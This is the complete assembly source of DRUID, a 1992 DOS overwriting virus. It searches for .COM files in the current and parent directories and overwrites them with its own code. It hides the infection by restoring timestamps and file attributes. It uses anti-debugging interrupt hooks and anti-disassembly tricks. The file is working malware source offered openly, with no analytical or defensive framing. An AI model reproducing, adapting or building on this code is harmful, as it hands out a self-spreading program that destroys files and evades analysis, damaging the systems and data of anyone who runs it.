fname           equ     9eh            ; pointer to filename in DTA

seg_a           segment byte public
		assume  cs:seg_a, ds:seg_a


                org     100h

druid           proc    far
vstart          equ     $

start:
                mov     ax,2EBh        ; used to baffle sourcer...
                jmp     $-2            ;

                mov     dx,offset newint ; set int1 to newint
                mov     ax,2501h
                int     21h

                mov     al,3           ; set int3 to newint
                int     21h

                mov     dx,offset newint  ; do it again...
                mov     ax,2501h
                int     21h
                mov     al,1
                int     21h

                mov     ah,47h         ; get current directory
                xor     dl,dl          ; and save it
                lea     si,currdir
                int     21h

again:

                lea     dx,fmask
                mov     ah,4Eh         ; Find first *.COM
getfile:
                int     21h

                jnc     found_ok       ;if ok, goto found_ok
                jmp     short bailout  ;if no more files, goto bail out
                nop
found_ok:
                mov     si,fname       ; load filename into ax
                lodsw
                cmp     ax,'OC'        ; if first 3 letters is "CO"
                                       ; as in "COMMAND.COM"
                jne     infect         ; if not, go on
                jmp     getnext        ; else, get another file

                mov     ax,2EBh        ; used to baffle sourcer...
                jmp     $-2
infect:
                mov     dx,fname       ; get attribute
                mov     ax,4300h       ; of the file found
                int     21h
                push    cx             ; and save it

                xor     cx,cx          ; reset attributes
                mov     ax,4301h
                int     21h

                mov     ax,2EBh        ; used to baffle sourcer...
                jmp     $-2

                mov     dx,fname       ; open file
                mov     ax,3D02h
                int     21h            ; DOS Services  ah=function 3Dh
                                       ;  open file, al=mode,name@ds:dx
                jc      getnext        ; if error, skip to loc_5

                xchg    ax,bx          ; get handle in bx

                mov     ax,5700h       ; get time'n date
                int     21h
                push    dx             ; save'em
                push    cx

                mov     ah,40h         ; write virus to target
                mov     cx,virlen      ; number of bytes to write
                mov     dx,fname       ; pointer to file
                int     21h

                pop     cx             ; restore the date'n time
                pop     dx
                mov     ax,5701h
                int     21h

                mov     ah,3Eh         ; close target
                int     21h

                pop     cx             ; restore the attributes
                mov     ax,4301h
                mov     dx,fname
                int     21h
getnext:
                mov     ah,4Fh         ; get next file matching *.COM
                jmp     short getfile
bailout:
                mov     ax,2EBh        ; used to baffle sourcer...
                jmp     $-2

                lea     dx,dot_dot     ; "cd.."
                mov     ah,3Bh
                int     21h

                jc      exit           ; if error, goto exit
                jmp     short again    ; do it all over again
exit:
                mov     ax,2EBh        ; used to baffle sourcer...
                jmp     $-2

                mov     ah,3Bh         ; change back to
                lea     dx,return_dir  ; original directory
                int     21h

                mov     ax,4C00h       ; quit to dos with
                int     21h            ; errorlevel 0

id  db      ' DRUID, coded by Morbid Angel/Line Noise -92 in Stockholm/Sweden'

druid           endp

newint          proc    far            ; replaces INT1 and INT3
                iret                   ; with this.
newint          endp

fmask           db      '*.COM',0
dot_dot         db      '..',0
return_dir      db      '\'            ; the slash is used when
currdir         dw      32 dup (?)     ; returning to old dir.

vend            equ     $
virlen          equ     vend - vstart

seg_a           ends
                end     start
